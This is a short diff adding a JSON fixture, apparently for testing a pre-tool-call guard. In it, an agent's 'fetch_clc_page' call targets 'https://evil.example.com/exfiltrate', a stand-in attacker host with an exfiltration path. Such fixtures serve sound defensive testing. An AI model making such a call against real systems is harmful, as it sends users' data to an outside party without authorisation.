@@ -1,0 +1,8 @@
+{
+  "phase": "before_tool",
+  "agent": "clc26_agent",
+  "tool": "fetch_clc_page",
+  "arguments": {
+    "path_or_url": "https://evil.example.com/exfiltrate"
+  }
+}
